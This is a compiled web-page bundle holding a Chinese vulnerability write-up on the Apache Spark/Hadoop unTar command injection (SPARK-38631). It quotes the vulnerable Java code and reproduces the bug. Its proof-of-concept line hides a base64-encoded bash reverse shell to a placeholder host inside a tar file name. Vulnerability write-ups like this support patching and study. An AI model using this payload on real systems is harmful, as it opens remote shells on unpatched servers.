import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const d={},r=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Spark 是一种用于大数据工作负载的分布式开源处理系统。它使用内存中缓存和优化的查询执行方式，可针对任何规模的数据进行快速分析查询。它提供使用 Java、Scala、Python 和 R 语言的开发 API，支持跨多个工作负载重用代码—批处理、交互式查询、实时分析、机器学习和图形处理等。当 Spark 任务的文件名可控时，<code>Utils.unpack</code> 采用命令拼接的形式对 tar 文件进行解压，存在任意命令注入的风险。这是源于 Hadoop 中 unTar 函数存在问题，在其执行 shell 命令之前未正确转义文件名，直接拼接命令导致任意命令注入。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Spark 3.1.2, 3.2.1, 3.3.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>查看官方的修复补丁</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251624131.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251624468.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>官方修复针对.tar 后缀的压缩包调用了新增的 unTarUsingJava 函数来进行处理，我们下载存在漏洞的版本看一下漏洞位置</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>hadoop-common-2.7.4.jar!/org/apache/hadoop/fs/FileUtil.class
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251624145.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到漏洞主要出现在 Linux 对文件的解压处理中</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public static void unTar(File inFile, File untarDir) throws IOException {
        if (!untarDir.mkdirs() &amp;&amp; !untarDir.isDirectory()) {
            throw new IOException(&quot;Mkdirs failed to create &quot; + untarDir);
        } else {
            boolean gzipped = inFile.toString().endsWith(&quot;gz&quot;);
            if (Shell.WINDOWS) {
                unTarUsingJava(inFile, untarDir, gzipped);
            } else {
                unTarUsingTar(inFile, untarDir, gzipped);
            }

        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里我们控制压缩 tar 文件的文件名就可以进行命令注入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private static void unTarUsingTar(File inFile, File untarDir, boolean gzipped) throws IOException {
        StringBuffer untarCommand = new StringBuffer();
        if (gzipped) {
            untarCommand.append(&quot; gzip -dc &#39;&quot;);
            untarCommand.append(makeShellPath(inFile));
            untarCommand.append(&quot;&#39; | (&quot;);
        }

        untarCommand.append(&quot;cd &#39;&quot;);
        untarCommand.append(makeShellPath(untarDir));
        untarCommand.append(&quot;&#39; ; &quot;);
        untarCommand.append(&quot;tar -xf &quot;);
        if (gzipped) {
            untarCommand.append(&quot; -)&quot;);
        } else {
            untarCommand.append(makeShellPath(inFile));
        }

        String[] shellCmd = new String[]{&quot;bash&quot;, &quot;-c&quot;, untarCommand.toString()};
        ShellCommandExecutor shexec = new ShellCommandExecutor(shellCmd);
        shexec.execute();
        int exitcode = shexec.getExitCode();
        if (exitcode != 0) {
            throw new IOException(&quot;Error untarring file &quot; + inFile + &quot;. Tar process exited with exit code &quot; + exitcode);
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建 Tar 文件, 在使用 addArchive 执行解压就可以注入恶意命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>touch &#39;1\\|{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}\\|1.tar&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251625299.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18),t=[r];function l(s,u){return i(),n("div",null,t)}const v=e(d,[["render",l],["__file","Apache Spark unTarUsingTar 命令注入漏洞 SPARK-38631.html.vue"]]);export{v as default};
